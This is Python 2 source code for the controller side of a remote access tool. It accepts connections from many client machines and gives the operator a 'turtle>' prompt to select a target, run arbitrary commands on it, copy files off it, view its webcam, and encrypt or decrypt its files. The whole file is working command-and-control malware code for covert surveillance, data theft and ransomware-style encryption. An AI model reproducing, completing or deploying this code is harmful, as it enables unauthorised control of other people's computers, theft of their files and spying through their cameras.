# Future imports to work like Python 3
from __future__ import print_function
import cv2
import time
import numpy
import socket
import threading
from Queue import Queue

# Constant variables
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'transfer': [
                'After making a connection, you can use this command '
                'to transfer files'],
            'encrypt': [
                'After making a connection, you can use this command '
                'to encrypt files on the clients computer'],
            'decrypt': [
                'After making a connection, you can use this command '
                'to decrypt files on the clients computer'],
            'select': [
                'Selects a client by its index on the list.'
                ' Takes index as a parameter'],
            'quit': [
                'Stops current connection with a client. To be used when'
                ' client is selected']
            }


def print_help():
    """
    The function prints all the commands we can use and what they do

    :return: None
    """
    for cmd, explanation in COMMANDS.iteritems():
        print("{0}:\t{1}".format(cmd, explanation[0]))


def socket_create():
    """
    The function creates socket (allows two computers to connect)

    :return: None
    """
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_bind():
    """
    The function binds socket to port and wait for connection from client


    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket binding error: ' + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


def accept_connections():
    """
    The function accepts connections from multiple clients and save to list


    :return: None
    """
    for connection in all_connections:
        connection.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n Connection has been established: " + address[0])
        except:
            print("Error accepting connections")


def start_turtle():
    """
    The function shows an interactive prompt for sending commands remotely


    :return: None
    """
    while True:
        cmd = raw_input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'help':
            print_help()
        else:
            print("Command not recognized")


def list_connections():
    """
    The function displays all the current connections

    :return: None
    """
    results = ''
    for counter, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[counter]
            del all_addresses[counter]
            continue
        results += str(counter) + '   ' + str(
            all_addresses[counter][0]) + '   ' + str(
            all_addresses[counter][1]) + '\n'
    print('------- Clients -------' + '\n' + results)


def get_target(cmd):
    """
    The function helps the server select a client

    :param cmd: The command we are trying to execute
    :type cmd: str

    :return: A IP address of a client to connect to
    :rtype: str
    """
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Not a valid selection")
        return None


def get_file(command, conn):
    """
    The function receives a file from the target computer

    :param command: The command with the file name
    :type command: str

    :param conn: The connection to the target computer

    :return: None
    """
    f = open(str(command[9:]), 'wb')
    not_exist = False
    while True:
        print("Receiving...")
        file_conn = conn.recv(20480)
        while file_conn:
            if str(file_conn).__contains__('The file was sent'):
                f.write(file_conn[:str(file_conn).find('The file was sent')])
                break
            elif str(file_conn).__contains__('The file does'):
                print('The file does not exist rewrite the command')
                not_exist = True
                break
            print("Receiving...")
            f.write(file_conn)
            file_conn = conn.recv(20480)
        if not not_exist:
            f.close()
            print("Done Receiving")
            print(str(file_conn[str(file_conn).find('The file was '
                                                    'sent'):]), end="")
            break


def get_camera(conn):
    """
    The function gets an image from the client through the socket
    and shows it on the screen

    :param conn: a connection

    :return: None
    """
    frame_data = conn.recv(4000000)
    frame = numpy.fromstring(frame_data, dtype=numpy.uint8)
    frame = frame.reshape(480, 640, 3)
    cv2.imshow("Capturing", frame)
    key = cv2.waitKey(0)
    if key:
        cv2.destroyAllWindows()


def send_target_commands(conn):
    """
    The function connects to a target client and executes commands

    :param conn: a connection

    :return: None
    """
    while True:
        try:
            cmd = raw_input()
            if len(str.encode(cmd)) > 0:
                if cmd[:8] == 'transfer':
                    conn.send(str.encode(cmd))
                    get_file(cmd, conn)
                    continue
                elif cmd.__contains__('show camera'):
                    conn.send(str.encode(cmd))
                    get_camera(conn)
                    continue
                else:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480))
                    print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break


def create_workers():
    """
    The function creates the threads (Workers)

    :return: None
    """
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    """
    The function does the next job in the queue (one handles connections,
    the other sends commands)

    :return: None
    """
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    """
    The function defines each item on the list as a new job

    :return: None
    """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
